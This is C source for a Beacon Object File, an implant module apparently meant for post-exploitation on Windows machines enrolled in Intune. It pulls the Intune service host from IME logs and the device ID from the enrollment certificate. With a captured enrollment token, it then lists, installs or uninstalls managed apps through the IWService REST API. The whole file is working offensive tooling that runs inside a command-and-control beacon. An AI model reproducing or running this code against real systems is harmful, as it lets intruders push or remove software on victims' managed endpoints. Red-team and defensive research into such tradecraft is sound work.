/*
 * apps BOF-PE - Intune app list/install/uninstall via IWService REST API
 *
 * Auto-discovers the IWService host from IME logs and the device ID from
 * the MDM enrollment certificate, matching the .NET reference behavior.
 *
 * Entry point: void go(const char *data, int len)
 *   arg0 (string) : enrollment token (from intune-exchange)
 *   arg1 (string) : command: "list", "install", "uninstall", "status"
 *   arg2 (string) : app GUID (required for install/uninstall/status, empty otherwise)
 *   arg3 (string) : host override (optional, empty = auto-discover from IME logs)
 */

#include "beacon.h"
#include "bofdefs_pe.h"
#include "intune_discovery.h"
#include "intune_http.h"

#define MAX_URL 4096

static const char *SERVICE_PARAMS =
    "api-version=18.14&ssp=WindowsUCP&ssp-version=11.2.2044.0"
    "&os=Windows&os-version=10.0.26200&os-sub=None&arch=x64"
    "&mgmt-agent=MicrosoftManagementPlatformCloudMdm";

/* ----------------------------------------------------------------
 * URL builder: base + SERVICE_PARAMS + optional extra
 * ---------------------------------------------------------------- */

static void build_url(char *out, int outsz, const char *base, const char *extra)
{
    const char *sep = bof_strchr(base, '?') ? "&" : "?";
    if (extra && extra[0])
        bof_snprintf(out, outsz, "%s%s%s&%s", base, sep, SERVICE_PARAMS, extra);
    else
        bof_snprintf(out, outsz, "%s%s%s", base, sep, SERVICE_PARAMS);
    out[outsz - 1] = '\0';
}

/* ----------------------------------------------------------------
 * JWT helpers: extract "oid" claim from an enrollment token
 * ---------------------------------------------------------------- */

static int b64url_decode_char(char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '-') return 62;
    if (c == '_') return 63;
    return -1;
}

static int b64url_decode(const char *in, int in_len, char *out, int outsz)
{
    int o = 0, bits = 0, val = 0;
    int i;
    for (i = 0; i < in_len && o < outsz - 1; i++) {
        int d = b64url_decode_char(in[i]);
        if (d < 0) continue;
        val = (val << 6) | d;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[o++] = (char)((val >> bits) & 0xFF);
        }
    }
    out[o] = '\0';
    return o;
}

static int extract_jwt_oid(const char *token, char *oid, int oidsz)
{
    const char *dot1 = bof_strchr(token, '.');
    if (!dot1) return 0;
    const char *payload = dot1 + 1;
    const char *dot2 = bof_strchr(payload, '.');
    int plen = dot2 ? (int)(dot2 - payload) : (int)bof_strlen(payload);
    if (plen <= 0 || plen > 4096) return 0;

    char *buf = (char *)bof_malloc(plen + 4);
    if (!buf) return 0;
    int decoded = b64url_decode(payload, plen, buf, plen + 4);
    if (decoded <= 0) { bof_free(buf); return 0; }

    int vlen = 0;
    const char *v = NULL;
    char pat[] = "\"oid\"";
    const char *p = bof_strstr(buf, pat);
    if (p) {
        p += 5;
        while (*p == ' ' || *p == ':' || *p == '\t') p++;
        if (*p == '"') {
            p++;
            v = p;
            while (*p && *p != '"') p++;
            vlen = (int)(p - v);
        }
    }
    int ok = 0;
    if (v && vlen > 0 && vlen < oidsz) {
        bof_memcpy(oid, v, vlen);
        oid[vlen] = '\0';
        ok = 1;
    }
    bof_free(buf);
    return ok;
}

/* ----------------------------------------------------------------
 * JSON helpers (string scanning, no parser)
 * ---------------------------------------------------------------- */

static const char *json_find_string(const char *json, const char *key, int *len)
{
    char pattern[256];
    bof_snprintf(pattern, sizeof(pattern), "\"%s\"", key);

    const char *p = json;
    while ((p = bof_strstr(p, pattern)) != NULL) {
        p += bof_strlen(pattern);
        while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r' || *p == ':')
            p++;
        if (*p == '"') {
            p++;
            const char *start = p;
            while (*p && !(*p == '"' && *(p-1) != '\\'))
                p++;
            if (len) *len = (int)(p - start);
            return start;
        }
    }
    return NULL;
}

static char *json_get_string(const char *json, const char *key)
{
    int len = 0;
    const char *val = json_find_string(json, key, &len);
    if (!val || len <= 0) return NULL;
    char *out = (char *)bof_malloc(len + 1);
    if (!out) return NULL;
    bof_memcpy(out, val, len);
    out[len] = '\0';
    return out;
}

static char *find_odata_action(const char *json, const char *action)
{
    char patterns[4][256];
    bof_snprintf(patterns[0], 256, "\"#CommonContainer.%s\"", action);
    bof_snprintf(patterns[1], 256, "\"#%s\"", action);
    bof_snprintf(patterns[2], 256, "\"%s\"", action);
    bof_snprintf(patterns[3], 256,
        "\"#Microsoft.Services.SystemCenter.IWService.Common.%s\"", action);

    int i;
    for (i = 0; i < 4; i++) {
        const char *p = bof_strstr(json, patterns[i]);
        if (!p) continue;
        p += bof_strlen(patterns[i]);

        const char *limit = p + 300;
        const char *end = json + bof_strlen(json);
        if (limit > end) limit = end;

        const char *t = p;
        while (t < limit) {
            t = bof_strstr(t, "\"target\"");
            if (!t || t >= limit) break;
            int tlen = 0;
            const char *tv = json_find_string(t - 1, "target", &tlen);
            if (tv && tlen > 0) {
                char *out = (char *)bof_malloc(tlen + 1);
                if (!out) return NULL;
                bof_memcpy(out, tv, tlen);
                out[tlen] = '\0';
                return out;
            }
            t++;
        }
    }
    return NULL;
}

typedef int (*array_cb)(const char *obj, int obj_len, void *ctx);

static int json_foreach_value(const char *json, array_cb cb, void *ctx)
{
    const char *arr = bof_strstr(json, "\"value\"");
    if (!arr) return 0;
    arr = bof_strchr(arr, '[');
    if (!arr) return 0;
    arr++;

    int count = 0;
    while (*arr) {
        while (*arr == ' ' || *arr == '\t' || *arr == '\n' || *arr == '\r' || *arr == ',')
            arr++;
        if (*arr == ']') break;
        if (*arr != '{') break;

        int depth = 0;
        const char *start = arr;
        while (*arr) {
            if (*arr == '{') depth++;
            else if (*arr == '}') {
                depth--;
                if (depth == 0) { arr++; break; }
            }
            else if (*arr == '"') {
                arr++;
                while (*arr && *arr != '"') {
                    if (*arr == '\\') arr++;
                    arr++;
                }
            }
            arr++;
        }

        int obj_len = (int)(arr - start);
        char *obj = (char *)bof_malloc(obj_len + 1);
        if (!obj) break;
        bof_memcpy(obj, start, obj_len);
        obj[obj_len] = '\0';

        int ret = cb(obj, obj_len, ctx);
        bof_free(obj);
        count++;
        if (ret != 0) break;
    }
    return count;
}

/* ----------------------------------------------------------------
 * Command: list
 * ---------------------------------------------------------------- */

typedef struct {
    int idx;
    const char *token;
    const char *iwurl;
    const char *device_id;
} CmdCtx;

static int list_app_cb(const char *obj, int obj_len, void *data)
{
    CmdCtx *ctx = (CmdCtx *)data;
    ctx->idx++;

    char *name = json_get_string(obj, "Name");
    char *guid = json_get_string(obj, "GuidKey");
    char *pub  = json_get_string(obj, "Publisher");

    BeaconPrintf(CALLBACK_OUTPUT, "  %-3d %-38s %-30s %s\n",
        ctx->idx,
        guid ? guid : "?",
        name ? name : "?",
        pub  ? pub  : "");

    if (name) bof_free(name);
    if (guid) bof_free(guid);
    if (pub)  bof_free(pub);
    return 0;
}

static int cmd_list(CmdCtx *ctx)
{
    char base[MAX_URL];
    bof_snprintf(base, sizeof(base), "%s/Applications?$top=100", ctx->iwurl);
    base[MAX_URL - 1] = '\0';

    char extra[256] = {0};
    if (ctx->device_id && ctx->device_id[0])
        bof_snprintf(extra, sizeof(extra), "device-id=%s", ctx->device_id);

    char url[MAX_URL];
    build_url(url, sizeof(url), base, extra);

    int status = 0;
    char *resp = http_request("GET", url, ctx->token, NULL, 1, NULL, &status);
    if (!resp) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Request failed (WinHTTP err=%lu). Wrong host for IWService?\n",
            bof_GetLastError());
        return 1;
    }

    if (status != 200) {
        int show = (int)bof_strlen(resp);
        if (show > 300) show = 300;
        BeaconPrintf(CALLBACK_ERROR, "[-] HTTP %d: %.*s\n", status, show, resp);
        bof_free(resp);
        return 1;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Applications:\n  %-3s %-38s %-30s %s\n  %s\n",
        "#", "AppId", "Name", "Publisher",
        "--------------------------------------------------------------------------");

    ctx->idx = 0;
    int n = json_foreach_value(resp, list_app_cb, ctx);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d app(s)\n", n);

    bof_free(resp);
    return 0;
}

/* ----------------------------------------------------------------
 * Command: status - show ApplicationState for a specific app
 * ---------------------------------------------------------------- */

static char *get_app_nav_link(CmdCtx *ctx, const char *app_guid)
{
    char base[MAX_URL];
    bof_snprintf(base, sizeof(base), "%s/Applications?$top=100", ctx->iwurl);

    char extra[256] = {0};
    if (ctx->device_id && ctx->device_id[0])
        bof_snprintf(extra, sizeof(extra), "device-id=%s", ctx->device_id);

    char url[MAX_URL];
    build_url(url, sizeof(url), base, extra);

    int status = 0;
    char *resp = http_request("GET", url, ctx->token, NULL, 1, NULL, &status);
    if (!resp || status != 200) {
        if (resp) bof_free(resp);
        return NULL;
    }

    const char *arr = bof_strstr(resp, "\"value\"");
    if (!arr) { bof_free(resp); return NULL; }
    arr = bof_strchr(arr, '[');
    if (!arr) { bof_free(resp); return NULL; }

    const char *search = arr;
    char *nav_link = NULL;

    while (1) {
        const char *obj_start = bof_strchr(search, '{');
        if (!obj_start) break;

        int depth = 0;
        const char *p = obj_start;
        while (*p) {
            if (*p == '{') depth++;
            else if (*p == '}') { depth--; if (depth == 0) { p++; break; } }
            else if (*p == '"') { p++; while (*p && *p != '"') { if (*p == '\\') p++; p++; } }
            p++;
        }
        int obj_len = (int)(p - obj_start);

        char *obj = (char *)bof_malloc(obj_len + 1);
        if (!obj) break;
        bof_memcpy(obj, obj_start, obj_len);
        obj[obj_len] = '\0';

        char *gk = json_get_string(obj, "GuidKey");
        if (gk && bof_stricmp(gk, app_guid) == 0)
            nav_link = json_get_string(obj, "ApplicationState@odata.navigationLinkUrl");

        if (gk) bof_free(gk);
        bof_free(obj);
        if (nav_link) break;
        search = p;
    }

    bof_free(resp);
    return nav_link;
}

static char *get_action_target(CmdCtx *ctx, const char *app_guid,
                               const char *action, int report_status)
{
    char *nav_link = get_app_nav_link(ctx, app_guid);
    if (!nav_link) {
        BeaconPrintf(CALLBACK_ERROR, "[-] App not found or no nav link: %s\n", app_guid);
        return NULL;
    }

    char abs_url[MAX_URL];
    if (bof_strncmp(nav_link, "http", 4) != 0)
        bof_snprintf(abs_url, sizeof(abs_url), "%s/%s", ctx->iwurl, nav_link);
    else
        bof_snprintf(abs_url, sizeof(abs_url), "%s", nav_link);
    bof_free(nav_link);

    char extra[512] = {0};
    if (ctx->device_id && ctx->device_id[0])
        bof_snprintf(extra, sizeof(extra),
            "$filter=DeviceId%%20eq%%20guid'%s'&device-id=%s",
            ctx->device_id, ctx->device_id);

    char url[MAX_URL];
    build_url(url, sizeof(url), abs_url, extra);

    int status = 0;
    char *resp = http_request("GET", url, ctx->token, NULL, 1, NULL, &status);
    if (!resp || status != 200) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ApplicationState request failed (HTTP %d)\n", status);
        if (resp) bof_free(resp);
        return NULL;
    }

    char *target = NULL;
    const char *arr = bof_strstr(resp, "\"value\"");
    if (arr) {
        arr = bof_strchr(arr, '[');
        if (arr) {
            const char *search = arr;
            while (1) {
                const char *obj_start = bof_strchr(search, '{');
                if (!obj_start) break;

                int depth = 0;
                const char *p = obj_start;
                while (*p) {
                    if (*p == '{') depth++;
                    else if (*p == '}') { depth--; if (depth == 0) { p++; break; } }
                    else if (*p == '"') { p++; while (*p && *p != '"') { if (*p == '\\') p++; p++; } }
                    p++;
                }
                int obj_len = (int)(p - obj_start);

                char *obj = (char *)bof_malloc(obj_len + 1);
                if (!obj) break;
                bof_memcpy(obj, obj_start, obj_len);
                obj[obj_len] = '\0';

                char *app_id = json_get_string(obj, "ApplicationId");
                if (app_id && bof_stricmp(app_id, app_guid) == 0) {
                    char *cs = json_get_string(obj, "CombinedStatus");
                    if (cs) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[*] App %s status: %s\n",
                            app_guid, cs);
                        bof_free(cs);
                    }
                    if (action)
                        target = find_odata_action(obj, action);
                }
                if (app_id) bof_free(app_id);
                bof_free(obj);
                if (target || (report_status && !action)) break;
                search = p;
            }
        }
    }

    bof_free(resp);
    return target;
}

static int cmd_status(CmdCtx *ctx, const char *app_guid)
{
    char *target = get_action_target(ctx, app_guid, NULL, 1);
    if (target) bof_free(target);
    return 0;
}

/* ----------------------------------------------------------------
 * Command: install / uninstall
 * ---------------------------------------------------------------- */

static int cmd_action(CmdCtx *ctx, const char *app_guid, const char *action)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Looking up %s action for %s...\n",
        action, app_guid);

    char *target = get_action_target(ctx, app_guid, action, 0);
    if (!target) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No %s action available for %s\n", action, app_guid);
        return 1;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] %s target found, POSTing...\n", action);

    char oid[128] = {0};
    char body[256] = {0};
    if (extract_jwt_oid(ctx->token, oid, sizeof(oid)) && oid[0])
        bof_snprintf(body, sizeof(body), "{\"UserId\":\"%s\"}", oid);

    char extra[256] = {0};
    if (ctx->device_id && ctx->device_id[0])
        bof_snprintf(extra, sizeof(extra), "device-id=%s", ctx->device_id);

    char url[MAX_URL];
    build_url(url, sizeof(url), target, extra);
    bof_free(target);

    int status = 0;
    char *resp = http_request("POST", url, ctx->token, body[0] ? body : "", 0, NULL, &status);

    if (status >= 200 && status < 300) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s succeeded (HTTP %d)\n", action, status);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] Restart IntuneManagementExtension service or wait for check-in to apply.\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] %s failed (HTTP %d)\n", action, status);
    }

    if (resp) bof_free(resp);
    return (status >= 200 && status < 300) ? 0 : 1;
}

/* ----------------------------------------------------------------
 * Entry point
 * ---------------------------------------------------------------- */

__declspec(dllexport) void go(const char *data, int len)
{
    BEACON_INIT;

    datap parser;
    BeaconDataParse(&parser, (char *)data, len);
    char *token         = BeaconDataExtract(&parser, NULL);
    char *command        = BeaconDataExtract(&parser, NULL);
    char *app_guid       = BeaconDataExtract(&parser, NULL);
    char *host_override  = BeaconDataExtract(&parser, NULL);

    if (!token || bof_strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No enrollment token provided\n");
        return;
    }
    if (!command || bof_strlen(command) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: intune-apps <token> <list|install|uninstall|status> [app_guid] [--host <override>]\n");
        return;
    }

    char host[256] = {0};
    if (host_override && bof_strlen(host_override) > 0) {
        bof_strncpy(host, host_override, 255);
        host[255] = '\0';
    } else {
        if (discover_host(host, sizeof(host), "fef.")) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Discovered host: %s\n", host);
        } else if (discover_host(host, sizeof(host), NULL)) {
            char fef[256] = {0};
            if (derive_fef_host(host, fef, sizeof(fef))) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[*] Derived IWService host: %s (from %s)\n", fef, host);
                bof_strncpy(host, fef, 255);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[!] Using fallback host: %s (may not serve IWService)\n", host);
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Could not discover host from IME logs. Use --host.\n");
            return;
        }
    }

    char iwurl[MAX_URL];
    bof_snprintf(iwurl, MAX_URL,
        "https://%s/TrafficGateway/TrafficRoutingService/IWService/StatelessIWService",
        host);
    iwurl[MAX_URL - 1] = '\0';

    char device_id[128] = {0};
    if (discover_device_id(device_id, sizeof(device_id)))
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Device ID: %s\n", device_id);

    CmdCtx ctx;
    bof_memset(&ctx, 0, sizeof(ctx));
    ctx.token = token;
    ctx.iwurl = iwurl;
    ctx.device_id = device_id;

    if (bof_stricmp(command, "list") == 0) {
        cmd_list(&ctx);
    }
    else if (bof_stricmp(command, "status") == 0) {
        if (!app_guid || bof_strlen(app_guid) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] status requires app GUID\n");
        } else {
            cmd_status(&ctx, app_guid);
        }
    }
    else if (bof_stricmp(command, "install") == 0) {
        if (!app_guid || bof_strlen(app_guid) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] install requires app GUID\n");
        } else {
            cmd_action(&ctx, app_guid, "Install");
        }
    }
    else if (bof_stricmp(command, "uninstall") == 0) {
        if (!app_guid || bof_strlen(app_guid) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] uninstall requires app GUID\n");
        } else {
            cmd_action(&ctx, app_guid, "Uninstall");
        }
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Unknown command: %s\n", command);
    }
}

BEACON_MAIN("zzzz", go)
